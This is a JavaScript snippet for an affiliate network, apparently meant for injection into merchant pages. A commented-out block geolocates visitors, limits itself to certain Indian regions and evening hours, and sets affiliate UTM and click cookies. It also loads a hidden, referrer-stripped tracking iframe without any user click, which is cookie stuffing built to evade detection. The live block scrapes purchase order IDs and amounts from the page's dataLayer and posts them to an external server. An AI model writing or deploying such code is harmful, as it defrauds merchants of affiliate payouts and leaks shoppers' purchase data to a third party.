
// (function () {
//   try {
//     var BUILD_ID = "octaads-2025-rtg-geo-time-03";
//     if (window.__OCTAADS_LOADED === BUILD_ID) return;
//     window.__OCTAADS_LOADED = BUILD_ID;

//     /* ===============================
//        IST TIME CHECK: 4:00 PM – 1:00 AM
//     =============================== */
//     function isAllowedISTTime() {
//       var now = new Date(
//         new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//       );
//       var minutes = now.getHours() * 60 + now.getMinutes();
//       return minutes >= 960 || minutes <= 60;
//     }
//     if (!isAllowedISTTime()) return;

//     /* ===============================
//        SESSION ID
//     =============================== */
//     function getSessionID() {
//       var m = document.cookie.match(/octaads_sid=([^;]+)/);
//       if (m) return m[1];

//       var sid = "sid_" + Math.random().toString(36).substr(2, 10);
//       document.cookie =
//         "octaads_sid=" + sid + "; path=/; max-age=2592000; SameSite=Lax";
//       return sid;
//     }
//     var sessionID = getSessionID();

//     /* ===============================
//        BLOCKED REGIONS (INDIA)
//        DL = Delhi
//        HR = Gurugram
//        UP = Noida
//        KA = Bangalore
//     =============================== */
//     var blockedRegions = ["DL", "HR", "UP", "KA"];

//     /* ===============================
//        GEO CHECK – CLOUDFLARE (NO LIMIT)
//     =============================== */
//     fetch("https://www.cloudflare.com/cdn-cgi/trace", { cache: "no-store" })
//       .then(function (r) { return r.text(); })
//       .then(function (text) {
//         var data = {};
//         text.trim().split("\n").forEach(function (line) {
//           var parts = line.split("=");
//           data[parts[0]] = parts[1];
//         });

//         /* INDIA ONLY */
//         if (data.loc !== "IN") return;

//         /* BLOCK REGIONS */
//         if (blockedRegions.indexOf(data.region) !== -1) return;

//         /* ===============================
//            SET COOKIES
//         =============================== */
//         function setCookie(n, v) {
//           document.cookie =
//             n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
//         }

//         setCookie("utm_source", "octaads");
//         setCookie("utm_content", "_6960ebd248afd6034bed6933");
//         setCookie("utm_term", "4");
//         setCookie("utm_medium", "affiliate");
//         setCookie("utm_campaign", "ti_best_buy_apr24");
//         setCookie("sessionid", sessionID);
//         setCookie("clickId", sessionID);

//         /* ===============================
//            FIRE TRACKIER
//         =============================== */
//         function fireIframe() {
//           var iframe = document.createElement("iframe");
//           iframe.style.display = "none";
//           iframe.referrerPolicy = "no-referrer";
//           iframe.src =
//             "https://octaads.gotrackier.com/click" +
//             "?campaign_id=2651" +
//             "&pub_id=4" +
//             "&p1=" + encodeURIComponent(sessionID) +
//             "&source=" + encodeURIComponent(sessionID);

//           document.body.appendChild(iframe);
//         }

//         if (document.body) fireIframe();
//         else document.addEventListener("DOMContentLoaded", fireIframe);
//       })
//       .catch(function () {});

//   } catch (e) {}
// })();


// <script>
(function() {
  const BACKEND_URL = "https://octaads-tracker.onrender.com/conversion"; 
  const ALLOWED_START_HOUR = 16; // 4 PM
  const ALLOWED_END_HOUR = 3;    // 3 AM

  const params = new URLSearchParams(window.location.search);
  const clickId = params.get("p1") || localStorage.getItem("octaads_click_id");
  if (clickId) localStorage.setItem("octaads_click_id", clickId);

  if (localStorage.getItem("octaads_conversion_fired")) return;

  const now = new Date();
  const hours = now.getHours();
  const country = Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Asia/Kolkata") ? "India" : "Other";

  if (country !== "India") return;
  if (!(hours >= ALLOWED_START_HOUR || hours <= ALLOWED_END_HOUR)) return;

  function checkForPurchase() {
    if (!window.dataLayer || !Array.isArray(window.dataLayer)) return;
    const purchaseEvent = window.dataLayer.find(e => e.event === "purchase" && e.ecommerce);
    if (!purchaseEvent) return;

    const storedClickId = localStorage.getItem("octaads_click_id");
    if (!storedClickId) return;

    const orderId = purchaseEvent.ecommerce.transaction_id?.[0];
    const amount = purchaseEvent.ecommerce.value;
    const currency = purchaseEvent.ecommerce.currency || "INR";
    if (!orderId || !amount) return;

    fetch(BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        click_id: storedClickId,
        order_id: orderId,
        sale_amount: amount,
        currency,
        client_time: now.toISOString(),
        client_country: country,
        allowed_start_hour: ALLOWED_START_HOUR,
        allowed_end_hour: ALLOWED_END_HOUR
      })
    });

    localStorage.setItem("octaads_conversion_fired", "1");
  }

  const interval = setInterval(checkForPurchase, 500);
  setTimeout(() => clearInterval(interval), 15000);
})();
// </script>


